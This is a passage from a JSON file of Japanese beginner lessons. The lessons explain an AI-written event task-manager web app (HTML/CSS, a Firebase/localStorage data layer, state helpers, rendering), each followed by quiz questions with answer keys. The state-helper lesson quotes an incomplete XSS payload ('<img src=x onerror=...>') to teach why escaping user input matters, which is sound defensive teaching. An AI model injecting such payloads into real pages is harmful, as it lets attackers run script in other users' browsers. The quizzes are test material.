がタスクのボタンに `class=\"chip s-doing\"` のようにクラスを付けると、その状態の色になります。**状態の名前と CSS のクラス名をそろえる** よくある工夫です。\n\n### 画面に固定された部品\n\n- `nav{position:fixed; bottom:0}`：タブを **画面の下に固定**。スクロールしても動かない\n- `body{padding-bottom:84px}`：固定したタブの裏に最後の項目が隠れないよう、下に余白を空ける\n- `env(safe-area-inset-bottom)`：iPhone の画面下のバー（ホームバー）にかからないようにする\n- `.modal{position:fixed; inset:0; background:rgba(0,0,0,.45)}`：画面全体を半透明の黒で覆い、真ん中に小窓を出す\n\n## 🐍 Python と比べると\n\n| HTML/CSS | Python で言うと |\n|---|---|\n| `id=\"main\"` の空の箱 | 後から値を入れる変数 `main = \"\"` |\n| CSS 変数 `--accent` | 定数 `ACCENT = \"#e2553f\"` を 1 か所に定義して使い回す |\n| `@media (prefers-color-scheme: dark)` | `if dark_mode: ACCENT = \"#ff7a63\"` |\n\n## 🔑 キーワード\n\n- **HTML**：ページの骨組み（何がどこにあるか）を書く言語\n- **CSS**：見た目（色・大きさ・配置）を書く言語\n- **id / class**：要素に付ける名札。id は 1 つだけ、class は何個にも付けられる\n- **CSS 変数**：`--名前` で値に名前を付け、`var(--名前)` で使う仕組み\n- **メディアクエリ（@media）**：画面の条件（ダークモード・画面幅など）によって CSS を切り替える仕組み\n- **position: fixed**：画面の決まった位置に固定する指定\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 色を CSS 変数にまとめていて、ダークモードにも対応している\n- ✅ スマホ（iPhone のホームバー）まで考えた配置\n- ⚠️ CSS を 1 行に詰めて書いているので読みにくい。ブラウザの開発者ツール（F12）で要素を選ぶと、どの CSS が効いているか見やすく表示される\n- ⚠️ フォントを Google Fonts から読み込むので、オフラインでは別のフォントで表示される（動作には影響なし）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「HTML の部分はほとんど空の箱で、ヘッダー・メイン・下のタブ・モーダルの 4 つに id を付けて置いているだけです。中身は JavaScript が後から入れます。\nCSS は色を CSS 変数にまとめていて、ダークモードのときは変数の値を入れ替えるだけで配色が変わるようになっています。タブは画面の下に固定されています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`<main id=\"main\"></main>` に最初から入っているものは？",
      "choices": [
       "何も入っていない（JavaScript が後から入れる）",
       "タスクの一覧",
       "ホーム画面"
      ],
      "answer": 0,
      "explain": "HTML は入れ物だけを用意し、中身は render() が入れます。"
     },
     {
      "question": "`color: var(--accent)` の意味は？",
      "choices": [
       "「--accent」という文字を表示する",
       "CSS 変数 --accent に入っている色を使う",
       "アクセント記号を付ける"
      ],
      "answer": 1,
      "explain": ":root で定義した色の値が使われます。"
     },
     {
      "question": "ダークモードの配色が切り替わる仕組みは？",
      "choices": [
       "JavaScript が全部の色を書き換えている",
       "@media で、ダークモードのときだけ CSS 変数の値を入れ替えている",
       "画像を入れ替えている"
      ],
      "answer": 1,
      "explain": "変数を使っているので、値を変えるだけで全体の色が変わります。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-02-html-css"
  },
  {
   "title": "データ層 ― Firebase とお試しモードを同じ使い方にする「窓口」",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 3,
   "series": "popup2027",
   "part": 3,
   "concepts": [
    "database",
    "async",
    "modules",
    "higher_order",
    "security"
   ],
   "lessons": [
    "20-javascript/07-promise-async",
    "20-javascript/08-modules-npm",
    "20-javascript/03-arrays-objects",
    "100-ai-dev/06-secrets-env"
   ],
   "summary": "Firebase（クラウド）と localStorage（端末）のどちらに保存しても、同じ 7 つの命令で使えるようにした「store」。",
   "body": "## 📄 解説するコード（96〜143 行目）\n\n```javascript\nconst FIREBASE_CONFIG = {\n  apiKey: \"***\",\n  authDomain: \"popup-2027.firebaseapp.com\",\n  projectId: \"popup-2027\",\n  storageBucket: \"popup-2027.firebasestorage.app\",\n  messagingSenderId: \"***\",\n  appId: \"***\",\n};\n\nconst DEFAULT_SETTINGS = { title: \"POP UP 2027\", date: \"2027-09-01\", members: [\"メンバーA\", \"メンバーB\", \"メンバーC\"] };\nconst COLS = [\"tasks\", \"milestones\", \"logs\", \"ideas\", \"expenses\"];\n\n// ---------- データ層 ----------\nlet store;\nif (FIREBASE_CONFIG) {\n  const { initializeApp } = await import(\"https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js\");\n  const fs = await import(\"https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js\");\n  const db = fs.getFirestore(initializeApp(FIREBASE_CONFIG));\n  const onErr = e => { console.error(e); S.error = \"データベースに接続できません（\" + (e.code || e.message) + \"）。Firestore の作成とルールを確認してください。\"; render(); };\n  store = {\n    live: true,\n    sub(col, cb) { return fs.onSnapshot(fs.collection(db, col), s => cb(s.docs.map(d => ({ id: d.id, ...d.data() }))), onErr); },\n    subSettings(cb) { return fs.onSnapshot(fs.doc(db, \"meta\", \"settings\"), s => cb(s.exists() ? s.data() : null), onErr); },\n    add(col, d) { return fs.addDoc(fs.collection(db, col), { ...d, createdAt: Date.now() }); },\n    update(col, id, d) { return fs.updateDoc(fs.doc(db, col, id), d); },\n    remove(col, id) { return fs.deleteDoc(fs.doc(db, col, id)); },\n    saveSettings(d) { return fs.setDoc(fs.doc(db, \"meta\", \"settings\"), d); },\n  };\n} else {\n  const listeners = {};\n  const read = k => { try { return JSON.parse(localStorage.getItem(\"pu:\" + k)) } catch { return null } };\n  const write = (k, v) => { try { localStorage.setItem(\"pu:\" + k, JSON.stringify(v)) } catch {} ; (listeners[k] || []).forEach(f => f(v)); };\n  window.addEventListener(\"storage\", e => { if (e.key?.startsWith(\"pu:\")) { const k = e.key.slice(3); (listeners[k] || []).forEach(f => f(read(k))); } });\n  const on = (k, f) => { (listeners[k] ||= []).push(f); f(read(k)); };\n  store = {\n    live: false,\n    sub(col, cb) { on(col, v => cb(v || [])); },\n    subSettings(cb) { on(\"settings\", cb); },\n    add(col, d) { write(col, [...(read(col) || []), { ...d, id: crypto.randomUUID?.() || String(Math.random()), createdAt: Date.now() }]); },\n    update(col, id, d) { write(col, (read(col) || []).map(x => x.id === id ? { ...x, ...d } : x)); },\n    remove(col, id) { write(col, (read(col) || []).filter(x => x.id !== id)); },\n    saveSettings(d) { write(\"settings\", d); },\n  };\n}\n```\n\n（Firebase の設定値の一部は `***` に伏せています）\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、**データを保存・読み込みする窓口（`store`）** を作る部分です。Firebase（クラウド）を使う版と、localStorage（この端末だけ）を使う版の 2 種類を用意し、**どちらでも同じ名前の命令で使える** ようにしています。このシリーズで一番大事で、少しむずかしい部分です。\n\n## 🗺️ 全体の流れ\n\n1. `FIREBASE_CONFIG` があれば、Firebase のライブラリをネットから読み込み、データベースにつなぐ\n2. 無ければ、ブラウザの localStorage を使う「お試しモード」の窓口を作る\n3. どちらの場合も、`store` に同じ 7 つの命令（`sub`・`subSettings`・`add`・`update`・`remove`・`saveSettings`・`live`）をそろえる\n4. 以降のコードは `store.add(\"tasks\", {...})` のように書くだけで、保存先を気にしない\n\n## 🔍 ブロックごとの解説\n\n### 窓口の命令の一覧\n\n| 命令 | 意味 | 例 |\n|---|---|---|\n| `sub(col, cb)` | そのデータを **見張り**、変わるたびに `cb` を呼んでもらう | タスク一覧が変わったら描き直す |\n| `subSettings(cb)` | 設定（タイトル・日付・メンバー名）を見張る | |\n| `add(col, d)` | 1 件追加 | タスクを追加 |\n| `update(col, id, d)` | 1 件の一部を書き換え | 状態を「完了」に |\n| `remove(col, id)` | 1 件削除 | |\n| `saveSettings(d)` | 設定を保存 | |\n| `live` | Firebase につながっているか（true / false） | 「お試しモード」の表示に使う |\n\n`col` は **コレクション**（データの種類ごとの入れ物）の名前で、`COLS` の 5 つ（tasks・milestones・logs・ideas・expenses）のどれかです。\n\n### Firebase 版：ライブラリを後から読み込む\n\n```javascript\nconst fs = await import(\"https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js\");\n```\n\n`import(...)` を **関数のように** 使うと、プログラムの途中でライブラリを読み込めます（動的インポート）。結果は Promise なので `await` で待ちます。\n普通は `await` は `async` 関数の中でしか使えませんが、`<script type=\"module\">` の一番外側では例外的に使えます（トップレベル await）。\n\n### onSnapshot：データを見張る\n\n```javascript\nsub(col, cb) { return fs.onSnapshot(fs.collection(db, col), s => cb(s.docs.map(d => ({ id: d.id, ...d.data() }))), onErr); }\n```\n\n`onSnapshot` は **「このデータが変わったら、毎回この関数を呼んで」と頼む** Firestore の機能です。自分の変更でも、他のメンバーの変更でも呼ばれます。これがリアルタイム同期の正体です。\n\n受け取ったデータ `s.docs` は扱いにくい形なので、`map` で `{ id: \"abc\", title: \"会場を探す\", ... }` という普通のオブジェクトの配列に変換して `cb` に渡しています。`...d.data()` はスプレッド構文で、中身を展開して `id` と合体させています。\n\n### お試し版：localStorage と「聞き手（listeners）」\n\n```javascript\nconst listeners = {};\nconst write = (k, v) => { localStorage.setItem(\"pu:\" + k, JSON.stringify(v)); (listeners[k] || []).forEach(f => f(v)); };\nconst on = (k, f) => { (listeners[k] ||= []).push(f); f(read(k)); };\n```\n\nlocalStorage には「変わったら知らせる」機能が無いので、**自分で作っています**。\n\n- `listeners`：`{ tasks: [関数, ...], ideas: [...] }` のように、データの種類ごとに「知らせてほしい関数」の一覧を持つ\n- `on`：関数を一覧に登録し、**すぐに一度** 今のデータで呼ぶ\n- `write`：保存したあと、登録された関数を全部呼ぶ（＝変わったことを知らせる）\n- `window.addEventListener(\"storage\", ...)`：**同じブラウザの別のタブ** で変更されたときも知らせる\n\nFirebase の `onSnapshot` と同じ動きを、小さく真似しているわけです。\n\n### 追加・更新・削除は「配列を作り直して保存」\n\n```javascript\nupdate(col, id, d) { write(col, (read(col) || []).map(x => x.id === id ? { ...x, ...d } : x)); }\nremove(col, id) { write(col, (read(col) || []).filter(x => x.id !== id)); }\n```\n\n- `update`：`map` で全件を見て、id が一致したものだけ `{ ...x, ...d }`（元の内容に変更を上書き）にする\n- `remove`：`filter` で、id が一致しないものだけ残す＝その 1 件を消す\n- `crypto.randomUUID?.()`：ランダムな ID を作る。`?.` は「この機能があれば呼ぶ」。無い古いブラウザでは `Math.random()` で代用\n\n## 🐍 Python と比べると\n\n| JavaScript | Python で言うと |\n|---|---|\n| `store = { add(col, d) {...}, ... }` | 同じメソッドを持つ 2 つのクラス `FirebaseStore` と `LocalStore` を作り、どちらかを `store` に入れる |\n| `await import(\"...\")` | `importlib.import_module(...)` で途中から読み込む |\n| `list.map(x => x.id === id ? {...x, ...d} : x)` | `[{**x, **d} if x[\"id\"] == id else x for x in lst]` |\n| `list.filter(x => x.id !== id)` | `[x for x in lst if x[\"id\"] != id]` |\n| `JSON.stringify` / `JSON.parse` | `json.dumps` / `json.loads` |\n\n**同じ使い方（インターフェース）で中身だけ取り替えられる** 設計は、fashion_news で「notion.py だけ取り替えれば LINE にも送れる」と話したのと同じ考え方です。\n\n## 🔑 キーワード\n\n- **データ層**：データの保存・読み込みだけを担当する部分\n- **Firestore**：Firebase のデータベース。コレクション（種類）とドキュメント（1 件）でデータを持つ\n- **onSnapshot**：データの変化を見張り、変わるたびに知らせてくれる Firestore の機能\n- **動的インポート**：`import()` で、プログラムの途中でライブラリを読み込むこと\n- **localStorage**：ブラウザにデータを保存する場所（文字列のみ。だから JSON に変換する）\n- **リスナー（listener）**：「何か起きたら呼んでほしい」と登録しておく関数\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 保存先の違いを `store` の中に閉じ込めていて、画面側のコードがすっきりしている\n- ✅ 接続に失敗したら、画面上部に原因のヒント付きで表示する\n- ✅ localStorage が使えない環境でも止まらないよう `try / catch` で守っている\n- ⚠️ `apiKey` などの Firebase の設定は、**Web アプリでは公開される前提の値** で、パスワードではない（ブラウザに届く時点で誰でも見られる）。その代わり、**Firestore のセキュリティルール** で「誰が読み書きできるか」を決める必要がある。このアプリにはログインが無いので、ルールの設定がとても重要\n- ⚠️ `if (FIREBASE_CONFIG)` は設定が書かれている今は常に Firebase モード。お試しモードにするには `const FIREBASE_CONFIG = null;` にする\n- ⚠️ お試しモードの `update` や `remove` は、毎回全件を読み直して書き直すので、データが多いと遅くなる（お試し用なので問題ない）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「データ層は、保存先が Firebase でも localStorage でも、同じ add・update・remove・sub の命令で使えるようにした窓口です。\nFirebase 版はライブラリを動的に読み込んで、onSnapshot でデータを見張り、変わるたびに画面側に知らせます。\nお試し版は localStorage には通知機能が無いので、知らせてほしい関数のリストを自分で持って、保存のたびに呼ぶことで同じ動きを再現しています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`store.add(\"tasks\", {...})` と書いたとき、保存先はどう決まる？",
      "choices": [
       "呼び出すたびに選ぶ",
       "最初に FIREBASE_CONFIG があるかで決まった store の中身による",
       "必ず両方に保存される"
      ],
      "answer": 1,
      "explain": "画面側は保存先を気にせず、同じ命令を呼ぶだけです。"
     },
     {
      "question": "`onSnapshot` の役割は？",
      "choices": [
       "データが変わるたびに、指定した関数を呼んでくれる",
       "データを一度だけ読み込む",
       "データを削除する"
      ],
      "answer": 0,
      "explain": "自分の変更でも他の人の変更でも呼ばれるので、リアルタイムに画面が更新されます。"
     },
     {
      "question": "`list.filter(x => x.id !== id)` は何をしている？",
      "choices": [
       "id が一致するものだけ残す",
       "id が一致する 1 件を取り除いた新しい配列を作る",
       "全件を削除する"
      ],
      "answer": 1,
      "explain": "一致「しない」ものだけを残すので、結果としてその 1 件が消えます。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-03-data-layer"
  },
  {
   "title": "状態（S）と小道具 ― アプリの「今」をまとめた箱と便利な関数",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 2,
   "series": "popup2027",
   "part": 4,
   "concepts": [
    "variables",
    "functions",
    "strings",
    "security",
    "collections"
   ],
   "lessons": [
    "20-javascript/01-js-basics",
    "20-javascript/04-functions-arrow",
    "20-javascript/03-arrays-objects",
    "20-javascript/06-dom-events"
   ],
   "summary": "アプリの今の状態をまとめたオブジェクト S と、無害化・日付・金額の表示などに使う小さな関数たち。",
   "body": "## 📄 解説するコード（145〜163 行目）\n\n```javascript\n// ---------- 状態 ----------\nconst S = { settings: DEFAULT_SETTINGS, tab: \"home\", filter: \"all\" };\nCOLS.forEach(c => S[c] = []);\nconst lsGet = k => { try { return localStorage.getItem(k) } catch { return null } };\nconst lsSet = (k, v) => { try { localStorage.setItem(k, v) } catch {} };\nS.me = lsGet(\"pu-me\");\nS.tab = lsGet(\"pu-tab\") || \"home\";\n\nconst esc = s => String(s ?? \"\").replace(/[&<>\"']/g, c => ({ \"&\": \"&amp;\", \"<\": \"&lt;\", \">\": \"&gt;\", '\"': \"&quot;\", \"'\": \"&#39;\" }[c]));\nconst today = () => { const d = new Date(); return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, \"0\")}-${String(d.getDate()).padStart(2, \"0\")}`; };\nconst fmtDate = s => s ? s.replace(/^(\\d{4})-(\\d{2})-(\\d{2})$/, (_, y, m, d) => `${y}/${+m}/${+d}`) : \"\";\nconst yen = n => \"¥\" + Math.round(n).toLocaleString(\"ja-JP\");\nconst byNew = (a, b) => (b.createdAt || 0) - (a.createdAt || 0);\nconst memberOpts = (sel, withNone) => (withNone ? `<option value=\"\">担当なし</option>` : \"\") + S.settings.members.map(m => `<option ${m === sel ? \"selected\" : \"\"}>${esc(m)}</option>`).join(\"\");\n\nconst TABS = [\n  [\"home\", \"🏠\", \"ホーム\"], [\"tasks\", \"✅\", \"タスク\"], [\"milestones\", \"📅\", \"予定\"],\n  [\"logs\", \"📝\", \"ログ\"], [\"ideas\", \"💡\", \"アイデア\"], [\"expenses\", \"💰\", \"お金\"],\n];\n```\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、**アプリの「今」を全部まとめた箱 `S`（State ＝状態）** と、あちこちで使う **小さな便利関数** の定義です。どれも 1 行関数（アロー関数）なので、1 つずつ分解して読めば怖くありません。\n\n## 🗺️ 全体の流れ\n\n1. `S` を作る：設定・今のタブ・絞り込みと、5 種類のデータ用の空の配列\n2. この端末に覚えてある「自分の名前」と「最後に開いていたタブ」を localStorage から読む\n3. 画面を作るときに使う便利関数（無害化・日付・金額・並べ替え・選択肢）を用意する\n4. 下のタブの一覧 `TABS` を定義する\n\n## 🔍 ブロックごとの解説\n\n### S：アプリの状態を 1 か所に\n\n```javascript\nconst S = { settings: DEFAULT_SETTINGS, tab: \"home\", filter: \"all\" };\nCOLS.forEach(c => S[c] = []);\n```\n\n最終的に `S` はこんな形になります。\n\n```javascript\n{\n  settings: { title: \"POP UP 2027\", date: \"2027-09-01\", members: [...] },\n  tab: \"home\",        // 今開いているタブ\n  filter: \"all\",      // タスクの絞り込み（全員 / メンバー名）\n  me: \"メンバーA\",     // 自分の名前\n  tasks: [], milestones: [], logs: [], ideas: [], expenses: [],  // データ\n  // 後から error・ideaPhoto・ideaDraft・busy なども入る\n}\n```\n\n**画面は S の中身だけを見て描かれます**。「画面を変えたいときは S を変えて render() を呼ぶ」のがこのアプリのルールです。\n`S[c] = []` の `[c]` は、変数 `c` の中身（\"tasks\" など）をキー名として使う書き方です。\n\n### lsGet / lsSet：失敗しても止まらない保存\n\nブラウザのプライベートモードなどでは localStorage が使えずエラーになることがあるので、`try / catch` で包んで「失敗したら何もしない」ようにしています。\n\n### esc：画面に出す前の無害化（とても大事）\n\n```javascript\nconst esc = s => String(s ?? \"\").replace(/[&<>\"']/g, c => ({ \"&\": \"&amp;\", ... }[c]));\n```\n\n`<` や `\"` などの記号を `&lt;` のような **ただの文字として表示される形** に置き換えます。\nこれをしないと、誰かがタスク名に `<img src=x onerror=...>` のような文字を入れたとき、**他のメンバーの画面でそのプログラムが動いてしまう**（XSS という攻撃）ことがあります。\nこのアプリは HTML を文字列で組み立てる作りなので、ユーザーが入力した文字には必ず `esc()` を通しています。\n\n- `s ?? \"\"`：s が null か undefined なら空文字\n- `/[&<>\"']/g`：正規表現。「この 5 つの記号のどれか」を、`g`（全部）探す\n- `{...}[c]`：見つかった記号 `c` を、その場で作った対応表から引いて置き換える\n\n### today / fmtDate：日付の形を整える\n\n```javascript\ntoday()                 // \"2026-11-17\"（今日を「年-月-日」の形で）\nfmtDate(\"2027-09-01\")   // \"2027/9/1\"（表示用に）\n```\n\n- `padStart(2, \"0\")`：1 桁の月日を `09` のように 2 桁にする\n- `getMonth() + 1`：JavaScript の月は **0 から始まる**（1 月が 0）ので 1 を足している。よくある落とし穴\n- `+m`：文字列 `\"09\"` の前に `+` を付けると数値 `9` になる（先頭の 0 が消える）\n\n### yen：金額の表示\n\n```javascript\nyen(1234.5)   // \"¥1,235\"\n```\n\n四捨五入して、`toLocaleString(\"ja-JP\")` で 3 桁ごとにカンマを入れています。\n\n### byNew / memberOpts：並べ替えと選択肢\n\n- `byNew`：`sort` に渡す比べ方の関数。作成日時の **新しい順**（`b - a` で大きい方が先）\n- `memberOpts`：メンバー名から `<option>` の HTML を作る。今の自分（`sel`）を最初から選ばれた状態にする\n\n### TABS：タブの一覧\n\n`[キー, アイコン, 表示名]` の配列の配列です。ここに 1 行足せばタブが増える（画面の関数も必要）ように、データとして持っています。\n\n## 🐍 Python と比べると\n\n| JavaScript | Python で言うと |\n|---|---|\n| `const S = {...}` | 辞書 `S = {...}`（中身は後から変えられる） |\n| `s ?? \"\"` | `s if s is not None else \"\"` |\n| `s.replace(/[&<>\"']/g, ...)` | `html.escape(s)`（Python の標準ライブラリにある） |\n| `` `${y}/${m}` `` | `f\"{y}/{m}\"` |\n| `String(n).padStart(2, \"0\")` | `str(n).zfill(2)` または `f\"{n:02d}\"` |\n| `Math.round(n).toLocaleString(\"ja-JP\")` | `f\"{round(n):,}\"` |\n| `getMonth()` が 0 始まり | Python の `date.month` は 1 始まり（JavaScript だけの注意点） |\n\n## 🔑 キーワード\n\n- **状態（state）**：アプリの「今」を表すデータ。画面はここから作られる\n- **エスケープ（無害化）**：記号を、ただの文字として表示される形に置き換えること\n- **XSS（クロスサイトスクリプティング）**：入力に紛れ込ませたプログラムを、他の人の画面で動かす攻撃\n- **アロー関数**：`x => ...` の短い関数の書き方\n- **null 合体演算子（??）**：左が null / undefined のときだけ右を使う\n- **比較関数**：`sort` に渡す「どちらを先にするか」を決める関数\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ ユーザーの入力を画面に出すときに `esc()` を通している\n- ✅ localStorage が使えない環境でも止まらない\n- ⚠️ 1 行に詰め込んだ関数が多く、読みにくい。理解するときは、例を入れて結果を書き出してみるとよい\n- ⚠️ `fmtDate` は「年-月-日」の形でない文字列が来ると、**そのまま返す**。返した値を `esc()` せずに画面に出している場所があり、データベースに変な値が入ると表示が崩れる（悪用される）可能性がある（6・7 ページ目の写真の扱いと合わせて注意点）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「S はアプリの状態をまとめたオブジェクトで、設定・今のタブ・自分の名前と、5 種類のデータの配列が入っています。画面は S だけを見て描くルールです。\nそのほか、記号を無害化して XSS を防ぐ esc、日付を整える today と fmtDate、金額を ¥ とカンマ付きにする yen などの小さな関数を用意しています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`esc('<b>')` の結果は？",
      "choices": [
       "<b>",
       "&lt;b&gt;",
       "b"
      ],
      "answer": 1,
      "explain": "< と > を、ただの文字として表示される形に置き換えます。"
     },
     {
      "question": "JavaScript で 2026 年 11 月の日付に対して `d.getMonth()` を呼ぶと？",
      "choices": [
       "11",
       "10",
       "12"
      ],
      "answer": 1,
      "explain": "月は 0 から数えるので、1 を足して使う必要があります。"
     },
     {
      "question": "`fmtDate(\"2027-09-01\")` の結果は？",
      "choices": [
       "\"2027/9/1\"",
       "\"2027/09/01\"",
       "\"9/1\""
      ],
      "answer": 0,
      "explain": "+m で \"09\" が数値の 9 になり、先頭の 0 が消えます。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-04-state-helpers"
  },
  {
   "title": "描画（1）― render とホーム・タスク・予定・ログの画面",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 2,
   "series": "popup2027",
   "part": 5,
   "concepts": [
    "dom_ui",
    "higher_order",
    "collections",
    "strings",
    "conditionals"
   ],
   "lessons": [
    "20-javascript/05-array-methods",
    "20-javascript/06-dom-events",
    "20-javascript/02-control-flow",
    "20-javascript/04-functions-arrow"
   ],
   "summary": "状態 S から HTML の文字列を組み立てて画面を描き直す render と、4 つの画面の作り方。",
   "body": "## 📄 解説するコード（165〜249 行目・抜粋）\n\n```javascript\n// ---------- 描画 ----------\nfunction render() {\n  document.title = S.settings.title;\n  document.getElementById(\"title\").textContent = S.settings.title;\n  document.getElementById(\"meBtn\").textContent = S.me ? `👤 ${S.me}` : \"名前を選ぶ\";\n  document.getElementById(\"nav\").innerHTML = TABS.map(([k, i, l]) => `<button data-tab=\"${k}\" class=\"${S.tab === k ? \"on\" : \"\"}\"><span>${i}</span>${l}</button>`).join(\"\");\n  const banner = S.error ? `<div class=\"banner\">${esc(S.error)}</div>` : store.live ? \"\" : `<div class=\"banner\">お試しモード：データはこの端末だけに保存されています（Firebase 未接続）</div>`;\n  document.getElementById(\"main\").innerHTML = banner + (VIEWS[S.tab] || VIEWS.home)();\n}\n\nconst VIEWS = {\n  home() {\n    const days = Math.ceil((new Date(S.settings.date + \"T00:00:00\") - new Date(today() + \"T00:00:00\")) / 864e5);\n    const total = S.tasks.length, done = S.tasks.filter(t => t.status === \"done\").length;\n    const next = S.milestones.filter(m => !m.done).sort((a, b) => (a.date || \"\").localeCompare(b.date || \"\")).slice(0, 3);\n    const mine = S.tasks.filter(t => t.assignee === S.me && t.status !== \"done\").sort((a, b) => (a.due || \"9\").localeCompare(b.due || \"9\")).slice(0, 5);\n    const logs = [...S.logs].sort(byNew).slice(0, 3);\n    return `\n    <div class=\"card\"><h2>本番まで（${fmtDate(S.settings.date)}）</h2>\n      <div class=\"count\"><b>${days >= 0 ? days : 0}</b><span>日</span></div></div>\n    <div class=\"card\"><h2>タスク進捗</h2>\n      <div class=\"row\"><span>${done} / ${total} 完了</span><span class=\"mini\">${total ? Math.round(done / total * 100) : 0}%</span></div>\n      <div class=\"bar\"><i style=\"width:${total ? done / total * 100 : 0}%\"></i></div></div>\n    ...（自分のやること・次の予定・最近のログ・設定ボタン）`;\n  },\n\n  tasks() {\n    const order = { doing: 0, todo: 1, done: 2 };\n    let list = [...S.tasks];\n    if (S.filter !== \"all\") list = list.filter(t => t.assignee === S.filter);\n    list.sort((a, b) => (order[a.status] - order[b.status]) || (a.due || \"9\").localeCompare(b.due || \"9\"));\n    const label = { todo: \"未着手\", doing: \"進行中\", done: \"完了\" };\n    return `\n    <form class=\"add\" data-form=\"tasks\">\n      <input class=\"grow\" name=\"title\" placeholder=\"やること\" required>\n      <select name=\"assignee\">${memberOpts(S.me, true)}</select>\n      <input type=\"date\" name=\"due\">\n      <button class=\"btn\">追加</button>\n    </form>\n    <div class=\"list\">${list.map(t => `\n      <div class=\"item ${t.status === \"done\" ? \"done\" : \"\"}\">\n        <button class=\"chip s-${t.status}\" data-cycle=\"${t.id}\">${label[t.status]}</button>\n        <div class=\"body\">${esc(t.title)}<div class=\"meta\">...</div></div>\n        <button class=\"x\" data-del=\"tasks:${t.id}\">×</button>\n      </div>`).join(\"\") || `<div class=\"empty\">タスクはまだありません</div>`}</div>`;\n  },\n\n  milestones() { /* 予定：日付順。過ぎた予定に class=\"past\" */ },\n  logs() { /* ログ：日付の新しい順 */ },\n  // ideas() と expenses() は 6 ページ目\n};\n```\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、**状態 `S` から画面を組み立てる** 部分です。各画面は「HTML の文字列を返す関数」になっていて、`render()` がそれを `#main` の箱に入れます。\n\n## 🗺️ 全体の流れ\n\n1. どこかで `S` が変わると `render()` が呼ばれる\n2. `render()` がタイトル・自分の名前・下のタブを書き換える\n3. 今のタブ（`S.tab`）に対応する画面の関数（`VIEWS.home` など）を呼び、HTML の文字列をもらう\n4. その文字列を `#main` に `innerHTML` で入れる → 画面が丸ごと新しくなる\n\n## 🔍 ブロックごとの解説\n\n### render：画面を丸ごと描き直す\n\n```javascript\ndocument.getElementById(\"main\").innerHTML = banner + (VIEWS[S.tab] || VIEWS.home)();\n```\n\n- `VIEWS[S.tab]`：`S.tab` が `\"tasks\"` なら `VIEWS.tasks`（画面の関数）を取り出す\n- `|| VIEWS.home`：知らないタブ名なら、ホームにする\n- 最後の `()` で関数を呼び、返ってきた HTML 文字列を箱に入れる\n\n変わった所だけを直すのではなく **毎回全部作り直す** ので、仕組みがとても単純です。小さなアプリならこれで十分速く動きます。\n\n### 下のタブを作る\n\n```javascript\nTABS.map(([k, i, l]) => `<button data-tab=\"${k}\" class=\"${S.tab === k ? \"on\" : \"\"}\">...`).join(\"\")\n```\n\n- `([k, i, l]) =>`：`[\"tasks\", \"✅\", \"タスク\"]` を 3 つの変数に **分割代入** して受け取る\n- 今のタブだけ `class=\"on\"`（色が付く）\n- `data-tab=\"tasks\"`：ボタンに付けた **メモ書き**。押されたときに、どのタブか分かる（7 ページ目）\n- `map` で作った文字列の配列を、`join(\"\")` で 1 つの文字列につなげる\n\n### ホーム：数字を計算して並べる\n\n```javascript\nconst days = Math.ceil((new Date(S.settings.date + \"T00:00:00\") - new Date(today() + \"T00:00:00\")) / 864e5);\n```\n\n日付どうしを引き算すると **ミリ秒（1000 分の 1 秒）** の差が出ます。`864e5` は `86400000`（1 日のミリ秒）なので、割ると日数になります。たとえば今日が 2026-11-17 なら、2027-09-01 まで **288 日** です。\n\n```javascript\nconst mine = S.tasks.filter(t => t.assignee === S.me && t.status !== \"done\")\n  .sort((a, b) => (a.due || \"9\").localeCompare(b.due || \"9\")).slice(0, 5);\n```\n\nメソッドチェーンを 1 段ずつ読みます。\n\n1. `filter`：自分が担当 **かつ** 完了していないタスクだけ\n2. `sort`：締め切りの早い順。締め切りが無いものは `\"9\"` として扱い、**一番後ろ** へ（日付の文字列 \"2027-...\" より \"9\" の方が後に来る）\n3. `slice(0, 5)`：先頭の 5 件だけ\n\n### タスク：並べ替えの 2 段階ルール\n\n```javascript\nconst order = { doing: 0, todo: 1, done: 2 };\nlist.sort((a, b) => (order[a.status] - order[b.status]) || (a.due || \"9\").localeCompare(b.due || \"9\"));\n```\n\n1. まず状態で並べる：**進行中 → 未着手 → 完了**\n2. 状態が同じなら（引き算が 0 になると `||` の右に進む）、締め切りの早い順\n\n`sort` の比較関数は「マイナスなら a が先、プラスなら b が先、0 なら同じ」というルールです。\n\n### 一覧が空のときの表示\n\n```javascript\n${list.map(t => `...`).join(\"\") || `<div class=\"empty\">タスクはまだありません</div>`}\n```\n\n1 件も無ければ `join(\"\")` は空文字になり、空文字は「偽」なので `||` の右側（「まだありません」）が使われます。\n\n### 予定・ログ\n\n- **予定**：日付の早い順。今日より前の予定には `class=\"past\"` を付けて、CSS で枠の色を変える。チェックボックスで完了にできる\n- **ログ**：日付の新しい順。同じ日付なら作成日時の新しい順（`byNew`）\n\n## 🐍 Python と比べると\n\n| JavaScript | Python で言うと |\n|---|---|\n| `VIEWS = { home() {...}, tasks() {...} }` | 関数を値に持つ辞書 `VIEWS = {\"home\": home, \"tasks\": tasks}` |\n| `VIEWS[S.tab] \\|\\| VIEWS.home` | `VIEWS.get(S[\"tab\"], home)` |\n| `list.map(t => `...`).join(\"\")` | `\"\".join(f\"...\" for t in lst)` |\n| 